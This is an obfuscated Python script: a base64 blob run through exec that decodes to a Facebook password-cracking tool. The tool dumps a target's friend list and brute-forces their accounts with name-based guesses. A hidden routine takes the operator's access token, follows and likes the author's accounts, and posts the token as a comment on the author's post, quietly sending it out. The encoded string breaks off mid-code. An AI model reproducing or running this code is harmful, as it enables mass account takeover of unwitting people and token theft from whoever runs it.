import base64
exec(base64.b64decode('IyAtKi0gY29kaW5nOiB1dGYtOA0KIyBjb2RlZCBieSBBcm1zdHJvbmcgT2didWFndQ0KIyBCYW5nIEFybXN0eSBTYXlhIE1hdSBSZWNvZGUNCiMgS2FyZW5hIFNheWEgQm9kb2gmVG9sb2wgS2FsYXUgU29hbCBOZ29kaW5nIEJhbmcNCiMgQmFrYXQgU2F5YSBIYW55YSBSZWNvZGUgRGFuIFNheWEgQmFuZ2dhIEthcm5hIFNheWEgTWFudXNpYSBTYW1wYWgNCg0KaW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgX19fX19fU0FZQU5HS0FNVV9fX19fXygncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KdHJ5Og0KICAgIGltcG9ydCBjb25jdXJyZW50LmZ1dHVyZXMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBfX19fX19TQVlBTkdLQU1VX19fX19fKCdwaXAgaW5zdGFsbCBmdXR1cmVzJykNCnRyeToNCiAgICBpbXBvcnQgYnM0DQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgX19fX19fU0FZQU5HS0FNVV9fX19fXygncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQsIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgbG9nZ2luZywgYmFzZTY0LHV1aWQNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIGxvbA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgcGFyc2VyDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXINCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCl9fX19fX0FybXN0eUdhbnNfX19fX189IGlucHV0DQp0cnk6dWdlbiA9IG9wZW4oJ3VzZXIudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCmV4Y2VwdDp1Z2VuID0gWydNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgMi4zLjQ7IHB0LXB0OyBTb255RXJpY3Nzb25MVDE4YSBCdWlsZC80LjAuMS5BLjAuMjY2KSBBcHBsZVdlYktpdC81MzMuMSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTMzLjEnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjE7IHJ1LXJ1OyA5OTMwaSBCdWlsZC9KT1A0MEQpIEFwcGxlV2ViS2l0LzUzNC4zMCAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTM0LjMwJywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDIuMy40OyBydS1ydTsgTUlEIEJ1aWxkL0dSSjIyKSBBcHBsZVdlYktpdC81MzMuMSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTMzLjEnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4zOyBlbi11czsgQVNVU19UMDBKIEJ1aWxkL0pTUzE1USkgQXBwbGVXZWJLaXQvNTM0LjMwIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgTW9iaWxlIFNhZmFyaS81MzQuMzAnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjI7IHJ1LXJ1OyBGbHkgSVE0NDA0IEJ1aWxkL0pEUTM5KSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBNb2JpbGUgU2FmYXJpLzUzNC4zMCBZYW5kZXhTZWFyY2gvNy4xNiddDQp0cnk6dWdlbjIgPSBvcGVuKCd1c2VyMi50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQ0KZXhjZXB0OnVnZW4yID0gWydNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgMi4zLjQ7IHB0LXB0OyBTb255RXJpY3Nzb25MVDE4YSBCdWlsZC80LjAuMS5BLjAuMjY2KSBBcHBsZVdlYktpdC81MzMuMSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTMzLjEnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjE7IHJ1LXJ1OyA5OTMwaSBCdWlsZC9KT1A0MEQpIEFwcGxlV2ViS2l0LzUzNC4zMCAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTM0LjMwJywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDIuMy40OyBydS1ydTsgTUlEIEJ1aWxkL0dSSjIyKSBBcHBsZVdlYktpdC81MzMuMSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTMzLjEnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4zOyBlbi11czsgQVNVU19UMDBKIEJ1aWxkL0pTUzE1USkgQXBwbGVXZWJLaXQvNTM0LjMwIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgTW9iaWxlIFNhZmFyaS81MzQuMzAnLCdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC4yLjI7IHJ1LXJ1OyBGbHkgSVE0NDA0IEJ1aWxkL0pEUTM5KSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBNb2JpbGUgU2FmYXJpLzUzNC4zMCBZYW5kZXhTZWFyY2gvNy4xNiddDQpfX19fX19fbG9vcF9fX19fXyA9IDANCl9fX19fX19va19fX19fX18gPSBbXQ0KX19fX19fX2NwX19fX19fXyA9IFtdDQpfX19fX19TQVlBTkdLQU1VX19fX19fPSBvcy5zeXN0ZW0NCmlkID0gW10NCmRhdGEgPSB7fQ0KcHd4ID0gW10NCl9fX19fX0FybXN0eV9fX19fXyA9cHJpbnQNCiMjIyNUQU1CQUggQk9MRUggVEFQSSBHQU5USSBKQU5HQU4jIyMjIw0KX19fX19MaXN0SURfX19fX19fID0gWw0KICAgICIxMDAwNzI3NDk1NjA5MjQiLCIxMDAwMjM3NDkzODcxMjQiLCIxMDAwNjk0OTQ2MDE5NjEiLCIxMDAwMDIzMjI1MzE3MTEiLCIxMDAwMTk2MDg4NDA0MjYiLCIxMDAwMjM1NDM5OTM3ODgiXQ0KX19fX19Qb3N0X19fX19fXz0gWw0KICAgICIxNjUyNzIwMDI0NjU5NTIiLCIxNTY0OTIzNjY3ODU3NDgiXQ0KX19fX19JTkZPX19fX19fID0gJ0x1IEdhbnRlbmcgQmFuZ2V0IEJhbmcsIEd3IE1hdSBSZWNvZGUgU0NsdSwgU29hbG55YSBHdyBCb2RvaCxHb2Jsb2sgJiBUb2xvbCBTb2FsIENvZGluZycNCnNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KcmdiID0gcmFuZG9tLmNob2ljZShbJ1x4MWJbMDs5MW0nLCAnXHgxYlswOzkybScsICdceDFiWzA7OTNtJywgJ1x4MWJbMDs5NG0nLCAnXHgxYlswOzk1bScsICdceDFiWzA7OTZtJywgJ1x4MWJbMDs5N20nLCAnXHgxYlswbSddKQ0KX19fX19fX0lQX19fX19fXyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dA0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbiA9IFsnSmFudWFyaScsICdGZWJydWFyaScsICdNYXJldCcsICdBcHJpbCcsICdNZWknLCAnSnVuaScsICdKdWxpJywgJ0FndXN0dXMnLCAnU2VwdGVtYmVyJywgJ09rdG9iZXInLCAnTm9wZW1iZXInLCAnRGVzZW1iZXInXQ0KdHJ5Og0KICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoNCiAgICAgICAgX19fX19fTHVXaWJ1X19fX19fKCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBfX19fX19MdVdpYnVfX19fX18oKQ0KIA0KZGVmIF9fX19fX0FybXN0eXhYRF9fX19fXyh6KToNCglmb3IgZSBpbiB6ICsgIlxuIjoNCgkJc3lzLnN0ZG91dC53cml0ZShlKQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJdGltZS5zbGVlcCgwLjAzKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW5bblRlbXBdDQojIyMgR0xPQkFMIFdBUk5BICMjIw0KUkVEX01BR0lDID0gJ1x4MDNceGYzXHJcbmRceDgzXHg4ZV4nDQpQID0gJ1x4MWJbMTs5N20nICMgUFVUSUgNCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJDQpwID0gIlx4MWJbMDszN20iICMgcHV0aWgNCm0gPSAiXHgxYlswOzMxbSIgIyBtZXJhaA0KaCA9ICJceDFiWzA7MzJtIiAjIGhpamF1DQprID0gIlx4MWJbMDszM20iICMga3VuaW5nDQpiID0gIlx4MWJbMDszNG0iICMgYmlydQ0KdSA9ICJceDFiWzA7MzVtIiAjIHVuZ3UNCm8gPSAiXHgxYlswOzM2bSIgIyBiaXJ1IG11ZGENCnkgPSAiXDAzM1swbSINCnogPSAiXDAzM1sxOzkybSINCnggPSAiXDAzM1sxOzk3bSINCkk9J1x4MWJbMDszMm0nDQpDPSdceDFiWzA7MzZtJw0KUiA9ICJcMDMzWzE7OTFtIg0KUCA9ICdceDFiWzE7OTdtJw0KTSA9ICdceDFiWzE7OTFtJw0KSCA9ICdceDFiWzE7OTJtJw0KSyA9ICdceDFiWzE7OTNtJw0KQiA9ICdceDFiWzE7OTRtJw0KUT0iXHgxYlswMG0iDQpVID0gJ1x4MWJbMTs5NW0nDQpPID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBDQpOID0gJ1x4MWJbMG0nDQpwID0gJ1x4MWJbMTs5N20nDQprID0gJ1x4MWJbMTs5M20nDQptID0gJ1x4MWJbMTs5MW0nDQpkID0gJ1x4MWJbOTA7MW0nDQpoID0gJ1x4MWJbOTI7MW0nDQprID0gJ1x4MWJbOTM7MW0nDQpiID0gJ1x4MWJbOTQ7MW0nDQpqID0gJ1x4MWJbOTU7MW0nDQphID0gJ1x4MWJbOTY7MW0nICAgDQpnID0gJ1wzM1szOzFtJw0KbXlfY29sb3IgPSBbDQogUCwgTSwgSCwgSywgQiwgVSwgTywgTiwgaiwgYSwgYiwgZCwgdSwgbywgaCwgbSwgTiwga10NCmlvciA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpfX19fX19MdVdpYnVfX19fX18gPSBleGl0DQpkZWYgX19fX19fX19MT0dPU0NSSVBUTllBX19fX19fX19fXygpOg0KCV9fX19fX1NBWUFOR0tBTVVfX19fX18oImNsZWFyIikNCglfX19fX19Bcm1zdHlfX19fX18oZiIiIiVzDQp7SH0g4pyTPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PeKckw0Ke0t9IOKckz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT3inJMNCntIfSDigKIgQ29kZSBCeSBBcm1zdHktQ3liZXIg4pml77iPIOKAog0KIOKAoiBXaGF0c0FwcDogMDkwNjk3MDIxNzIg4oCiDQp7S30g4oCiIE5pZ2VyaWEg8J+MjvCfj4zvuI8g4oCiDQp7S30g4oCiIEZyZWUgVG9vbCDwn4+G8J+UpSDigKIgDQp7S30g4pyTPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PeKckw0Ke0h9IOKckz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT3inJMNCiIiIiUoTikpDQogICAgICAgICANCmRlZiBfX19SZWNvZGVTYW1wYWhfXygpOg0KCXRyeToNCgkJdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnLCAncicpDQoJCV9fX1NheWFSZWNvZGVTYW1wYWhfX18oKQ0KCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQlfX19fX19TQVlBTkdLQU1VX19fX19fKCdybSAtcmYgbG9naW4udHh0JykNCgkJX19fX19fX19MT0dPU0NSSVBUTllBX19fX19fX19fXygpDQoJCV9fX19fX0FybXN0eV9fX19fXyhmIiBcbiB7UH1be0h9IXtQfV0gVG9rZW5zIG11c3QgYmUgZnJlc2ggYW5kIEVBQUIgXG4ge1B9W3tIfSF7UH1dIElmIHRoZSB0b2tlbiBpcyBub3QgRUFBQiB0aGVuIGl0IHdpbGwgZmFpbCBEdW1wIikNCgkJdG9rZW4gPSBfX19fX19Bcm1zdHlHYW5zX19fX19fKGYne1B9IFt7SH0/e1B9XSBUb2tlbiA6ICcpDQoJCXRyeToNCgkJCW90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKQ0KCQkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCQl6ZWRkID0gb3BlbignbG9naW4udHh0JywgJ3cnKQ0KCQkJemVkZC53cml0ZSh0b2tlbikNCgkJCXplZGQuY2xvc2UoKQ0KCQkJbmFtYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKS5qc29uKClbJ25hbWUnXQ0KCQkJX19fX19fQXJtc3R5X19fX19fKCJcbiAlc1slc+KAoiVzXSBXZWxjb21lICAlcyVzIiUoUCxILFAsSCxuYW1hKSk7dGltZS5zbGVlcCgwMC45KQ0KCQkJX19fX19fQXJtc3R5X19fX19fKCIgJXNbJXPigKIlc10gVXNlIFRoZXNlIFRvb2xzIFdpc2VseSAiJShQLEgsUCkpO3RpbWUuc2xlZXAoMDAuOSkNCgkJCV9fX19fX0FybXN0eV9fX19fXygiICVzWyVz4oCiJXNdIEknbSBOb3QgUmVzcG9uc2libGUgSWYgU29tZXRoaW5nIEhhcHBlbnMgIiUoUCxILFApKTt0aW1lLnNsZWVwKDAwLjkpDQoJCQlfX19fX19Bcm1zdHlHYW5zX19fX19fKCIgJXNbJXPigKIlc10gUFJFU1MgRU5URVIgIiUoUCxILFApKTt0aW1lLnNsZWVwKDMpDQoJCQlfX19fX2JvdF9fX19fX19fKCk7X19fU2F5YVJlY29kZVNhbXBhaF9fXygpDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCV9fX19fX0FybXN0eV9fX19fXyhmJ3tQfSBbe019IXtQfV0gRXhwaXJlZCBUb2tlbicpDQoJCQlfX19fX19MdVdpYnVfX19fX18oKSANCiMjIyMjWUFORyBHQU5USSBBTkFLIEhBUkFNIyMjIyMNCmRlZiBfX19fX2JvdF9fX19fX19fKCk6DQoJdHJ5Og0KCQl0b2tlbiA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpDQoJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCV9fX19fX0x1V2lidV9fX19fXygiICVzWyFdIHRva2VuIGthZGFsdXdhcnNhISIlKE0pKQ0KCV9fX19fX2tvbV9fX19fXyA9ICgnSGFsbyBCYW5nIEFybXN0eSBTQyBMdSBHRyBCYW5nJykgDQoJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUoX19fX19MaXN0SURfX19fX19fLHRva2VuKSkNCglyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9saWtlcz9zdW1tYXJ5PXRydWUmYWNjZXNzX3Rva2VuPSVzJyUoX19fX19Qb3N0X19fX19fXywgdG9rZW4pKQ0KCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2NvbW1lbnRzLz9tZXNzYWdlPSVzJmFjY2Vzc190b2tlbj0lcyclKF9fX19fUG9zdF9fX19fX18sX19fX19JTkZPX19fX19fLHRva2VuKSkNCglyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9jb21tZW50cy8/bWVzc2FnZT0lcyZhY2Nlc3NfdG9rZW49JXMnJShfX19fX1Bvc3RfX19fX19fLF9fX19fX2tvbV9fX19fXyx0b2tlbikpDQoJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvY29tbWVudHMvP21lc3NhZ2U9JXMmYWNjZXNzX3Rva2VuPSVzJyUoX19fX19Qb3N0X19fX19fXyx0b2tlbiwgdG9rZW4pKQ0KDQpkZWYgX19jZWtha3VuX18oKToNCiAgICBfX19fX19Bcm1zdHlfX19fX18oZiIgXG4ge1B9W3tIfTF7UH1dIENoZWNrIFJlc3VsdHMgT0sgIikNCiAgICBfX19fX19Bcm1zdHlfX19fX18oZiIge1B9W3tIfTJ7UH1dIENoZWNrIFJlc3VsdHMgQ1AgIikNCiAgICBhbmpnID0gX19fX19fQXJtc3R5R2Fuc19fX19fXyhmIiBcbiB7UH1be0h9P3tQfV0gU2VsZWN0IDogIikNCiAgICBpZiBhbmpnID09ICcnOg0KICAgICAgICBfX19TYXlhUmVjb2RlU2FtcGFoX19fKCkNCiAgICBlbGlmIGFuamcgPT0gJzAxJyBvciBhbmpnID09ICcxJzoNCiAgICAgICAgX19fX19fU0FZQU5HS0FNVV9fX19fXygnIGNhdCBvay50eHQnKQ0KICAgICAgICBfX19fX19Bcm1zdHlHYW5zX19fX19fKCdcbiBbXHhlMlx4ODBceGEyXSBLZW1iYWxpICcpDQogICAgICAgIF9fX1NheWFSZWNvZGVTYW1wYWhfX18oKQ0KICAgIGVsaWYgYW5qZyA9PSAnMDInIG9yIGFuamcgPT0gJzInOg0KICAgICAgICB0b3RhbGNwID0gb3BlbignY3AudHh0JykucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICBfX19fX19TQVlBTkdLQU1VX19fX19fKCcgY2F0IGNwLnR4dCcpDQogICAgICAgIF9fX19fX0FybXN0eUdhbnNfX19fX18oJ1xuIFtceGUyXHg4MFx4YTJdIGtlbWJhbGkgJykNCiAgICAgICAgX19fU2F5YVJlY29kZVNhbXBhaF9fXygpDQogICAgZWxzZToNCiAgICAgICAgX19fX19fQXJtc3R5X19fX19fKCAnIFshXSBwaWxpaCB5YW5nIGJlbmFyISEnKQ0KICAgICAgICBfX19TYXlhUmVjb2RlU2FtcGFoX19fKCkNCmRlZiBfX3VwZ3JhZGVfXygpOg0KCV9fX19fX0FybXN0eV9fX19fXygnIFshXSBXYWl0Jyk7dGltZS5zbGVlcCgzKQ0KCV9fX19fX0FybXN0eUdhbnNfX19fX18oJyA+Pj4gRW50ZXIgJykNCglfX19fX19TQVlBTkdLQU1VX19fX19fKCdhbSBzdGFydCBodHRwczovL3dhLm1lLysyMzQ5MDY5NzAyMTcyP3RleHQ9QXNzYWxhbXVhbGFpa3VtLCtCYW5nK0FybXN0eSwrU2F5YStJbmdpbitVcGdyYWRlK1ByZW1pdW0rJTIwPi9kZXYvbnVsbCcpDQoJX19fX19fTHVXaWJ1X19fX19fKCdTZWxhbWF0IFRpbmdnYWwnKQ0KCQkNCmRlZiBfX19fX1B1YmxpY19fX19fX18oKToNCgl0cnk6DQoJCXRva2VuID0gb3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlfX19fX19MdVdpYnVfX19fX18oKQ0KCV9fX19fX0FybXN0eV9fX19fXyhQKydcbiBbJytoKyfigKInK1ArJ10gVHlwZSAibWUiIGlmIHlvdSB3YW50IHRvIGR1bXAgSUQgZnJvbSBZb3VyIE93biBmcmllbmRzJykNCglwaWwgPSBfX19fX19Bcm1zdHlHYW5zX19fX19fKFArJyBbJytoKyc/JytQKyddIEVudGVyIFRhcmdldCBJRCA6ICcpDQoJdHJ5Og0KCQlrb2ggPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrcGlsKyc/YWNjZXNzX3Rva2VuPScrdG9rZW4pDQoJCWdyZXggPSBqc29uLmxvYWRzKGtvaC50ZXh0KVsnbmFtZSddDQoJCV9fX19fX0FybXN0eV9fX19fXyhQKycgWycraCsn4oCiJytQKyddIE5hbWUgIDogJytzdHIoZ3JleCkpDQoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToNCgkJX19fX19fQXJtc3R5X19fX19fKFArJyBbJytoKychJytQKyddIElEIE5PVCBGT1VORCcpDQoJCV9fX19fX0x1V2lidV9fX19fXygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlfX19fX19Bcm1zdHlfX19fX18oUCsnIFsnK2grJyEnK1ArJ10gS09ORVNJIElOVEVSTkVUIFRJREFLIFNUQUJJTCcpDQoJCV9fX19fX0x1V2lidV9fX19fXygpDQoJdHJ5Og0KCQlwbyA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3twaWx9P2ZpZWxkcz1uYW1lLGZyaWVuZHMuZmllbGRzKGlkLG5hbWUpLmxpbWl0KDUwMDApJmFjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpDQoJCWZvciBpIGluIHBvWydmcmllbmRzJ11bJ2RhdGEnXToNCgkJCWlkLmFwcGVuZChmIntpWydpZCddfXx7aVsnbmFtZSddfSIpDQoJCV9fX19fX0FybXN0eV9fX19fXyhQKycgWycraCsn4oCiJytQKyddIFRvdGFsIDogJytzdHIobGVuKGlkKSkpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlfX19fX19Bcm1zdHlfX19fX18oUCsnIFsnK2grJyEnK1ArJ10gS09ORUtTSSBJTlRFUk5FVCBCRVJNQVNBTEFIJykNCgkJX19fX19fTHVXaWJ1X19fX19fKCkNCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlfX19fX19Bcm1zdHlfX19fX18oUCsnIFsnK2grJyEnK1ArJ10gUEVSVEVNQU5BTiBUQVJHRVQgVElEQUtMQUggRElQdWJsaWNBTicpDQoJCV9fX19fX0x1V2lidV9fX19fXygpDQoJX19fX19fQXJtc3R5X19fX19fKGYiIFxuIHtQfVt7SH0/e1B9XSBkbyB5b3Ugd2FudCB0byB1c2UgbWFudWFsIHBhc3N3b3JkPz8gW1kvdF0gIikNCglhc2s9X19fX19fQXJtc3R5R2Fuc19fX19fXygiICVzWyVzPyVzXSAlc3BpbGloIDolcyAiJShwLEgscCxwLHApKQ0KCWlmIGFzayBpblsiIl06DQoJCV9fX19fX0x1V2lidV9fX19fXyhmIiB7UH1be0h9IXtQfV0gUGlsaWhhbiBUaWRhayBBZGEiKQ0KCWVsaWYgYXNrIGluWyJ0Il06DQoJCV9fX19fTEFOR1NVTkdfX19fXygpDQoJZWxpZiBhc2sgaW5bInkiXToNCgkJX19fX01BTlVBTF9fX19fKCkNCgllbHNlOg0KCQlfX19fX19MdVdpYnVfX19fX18oZiIge1B9W3tIfSF7UH1dIFBpbGloYW4gVGlkYWsgQWRhIikNCg0KIyMjIE9UT01BVElTICMjIw0KZGVmIF9fX19fTEFOR1NVTkdfX19fXygpOg0KCV9fX19fX0FybXN0eV9fX19fXygiIikNCglfX19fX19Bcm1zdHlfX19fX18oJyAlc1slcyslc10gJXNoYXNpbCAlc09LICVzZGlzaW1wYW4ga2UgLT4gJXNvay50eHQnJShwLHAscCxwLHAscCxIKSkNCglfX19fX19Bcm1zdHlfX19fX18oJyAlc1slcyslc10gJXNoYXNpbCAlc0NQICVzZGlzaW1wYW4ga2UgLT4gJXNjcC50eHQnJShwLHAscCxwLHAscCxLKSkNCglfX19fX19Bcm1zdHl4WERfX19fX18oIiAlc1slcyElc10gJXNqaWthIHRpZGFrICVzYWRhICVzaGFzaWwgbW9kZSBwZXNhd2F0a2FuIC0+ICVzNSBkZXRpa1xuIiUocCxNLHAscCxwLHAscCkpDQoJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIEFybXN0eToNCgkJZm9yIHVzZXIgaW4gaWQ6DQoJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCJ8IikNCgkJCW5hbSA9IG5hbWUuc3BsaXQoJyAnKQ0KCQkJaWYgbGVuKG5hbWUpID09IDMgb3IgbGVuKG5hbWUpID09IDQgb3IgbGVuKG5hbWUpID09IDU6DQoJCQkJcHd4ID0gW25hbWUsIG5hbVswXSsiMTIzIiwgbmFtWzBdKyIxMjM0IiwgbmFtWzBdKyIxMjM0NSJdDQoJCQllbHNlOg0KCQkJCXB3eCA9IFtuYW1lLCBuYW1bMF0rIjEyMyIsIG5hbVswXSsiMTIzNCIsIG5hbVswXSsiMTIzNDUiXQ0KCQkJQXJtc3R5LnN1Ym1pdChhcGlpLCB1aWQsIHB3eCkNCgkJcGFzcw0KCV9fX19fX0x1V2lidV9fX19fXygiXG5cbiBbI10gY3JhY2sgc2VsZXNhaS4uLiIpDQojIyMgTUFOVUFMICMjIw0KZGVmIF9fX19NQU5VQUxfX19fXygpOg0KCV9fX19fX0FybXN0eV9fX19fXygiICVzWyVzISVzXSAlc2d1bmFrYW4gLCAoJXNrb21hJXMpIHNlYmFnYWkgcGVtaXNhaCIlKHAscCxwLHAscCxOKSkNCglwd2VrPV9fX19fX0FybXN0eUdhbnNfX19fX18oJyAlc1slcz8lc10gJXNidWF0IGthdGEgc2FuZGkgOiVzICclKHAscCxwLHAscCxIKSkNCglpZiBwd2VrPT0iIjoNCgkJX19fX19fTHVXaWJ1X19fX19fKCIgJXNbIV0gaXNpIGphd2FiYW4gZGVuZ2FuIGJlbmFyISIlKE0pKQ0KCWVsaWYgbGVuKHB3ZWspPD01Og0KCQlfX19fX19MdVdpYnVfX19fX18oIiAlc1shXSBtYXN1a2FuIHNhbmRpIG1pbmltYWwgNiBhbmdrYSEiJShNKSkNCgkJX19fX19fQXJtc3R5X19fX19fKCcgJXNbJXMrJXNdICVzaGFzaWwgJXNPSyAlc2Rpc2ltcGFuIGtlIC0+ICVzb2sudHh0JyUocCxwLHAscCxwLHAsSCkpDQoJCV9fX19fX0FybXN0eV9fX19fXygnICVzWyVzKyVzXSAlc2hhc2lsICVzQ1AgJXNkaXNpbXBhbiBrZSAtPiAlc2NwLnR4dCclKHAscCxwLHAscCxwLEspKQ0KCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgQXJtc3R5Og0KCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgifCIpDQoJCQkJQXJtc3R5LnN1Ym1pdChhcGksIHVpZCwgcHdlay5zcGxpdCgiLCIpKQ0KCQlfX19fX19MdVdpYnVfX19fX18oIlxuXG4gWyNdIGNyYWNrIHNlbGVzYWkuLi4iKQ0KZGVmIGFwaWkodWlkLCBwd3gpOg0KCWdsb2JhbCBfX19fX19fb2tfX19fX19fLCBfX19fX19fY3BfX19fX19fLCBfX19fX19fbG9vcF9fX19fXw0KCXJnYiA9IHJhbmRvbS5jaG9pY2UoWydceDFiWzE7OTZtJywgJ1x4MWJbMTs5M20nLCAnXDAzM1sxOzkybScsICdcMDMzWzE7OTdtJywgJ1wwMzNbMTs5MW0nLCAnXDAzM1sxOzkxbScsICdceDFiWzE7OTJtJywgJ1x4MWJbMDs5Mm0nLCAnXHgxYlswOzkzbScsICdceDFiWzA7OTRtJywgJ1x4MWJbMDs5NW0nLCAnXHgxYlswOzk2bScsICdceDFiWzA7OTdtJywgJ1x4MWJbMG0nXSkNCglmb3Igd2sgaW4gbGlzdCgnXHwtLycpOg0KCQlzeXMuc3Rkb3V0LndyaXRlKCJcciAlc1slcyVzJXNdIFsgJXNDcmFjayAlc10gJXMvJXMgT0svJXMgLSBDUC8lcyAiJShyZ2IsSyx3ayxyZ2IscmdiLHJnYixfX19fX19fbG9vcF9fX19fXywgbGVuKGlkKSwgbGVuKF9fX19fX19va19fX19fX18pLCBsZW4oX19fX19fX2NwX19fX1